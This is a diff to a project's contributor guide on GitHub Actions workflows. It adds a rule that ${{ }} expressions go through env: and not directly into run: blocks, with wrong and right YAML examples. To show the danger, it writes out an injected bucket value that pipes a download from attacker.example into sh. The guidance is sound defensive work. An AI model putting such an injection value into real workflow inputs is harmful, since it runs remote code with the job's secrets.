@@ -184,6 +184,24 @@ Rules that apply to all of them:
   CodeQL's `actions` analysis enforces exactly this split, and will comment on
   a pull request that gets it wrong — which is also why `codeql.yml` includes
   `actions` in its language matrix. Workflows are code.
+- **Never interpolate `${{ }}` into a `run:` block.** Pass the value through
+  `env:` and reference it as a shell variable:
+
+  ```yaml
+  # wrong - the value is pasted into the script before bash sees it
+  run: archivist publish --bucket "${{ inputs.bucket }}"
+
+  # right - bash receives the value as data
+  env:
+    BUCKET: ${{ inputs.bucket }}
+  run: archivist publish --bucket "$BUCKET"
+  ```
+
+  A bucket value of `b"; curl attacker.example/x | sh; echo "` is not a bucket
+  name in the first form — it is three commands, run with whatever secrets the
+  job holds. This applies to any expression an outside contributor can
+  influence: inputs, issue and PR titles and bodies, branch names. CodeQL's
+  `actions` analysis catches it and will comment on the pull request.
 - Every job that writes to a shared destination declares a `concurrency` group.
 - Never end a step in `|| true`. A swallowed failure in a publish step produces
   a green run and a broken artefact, which is worse than a red run.
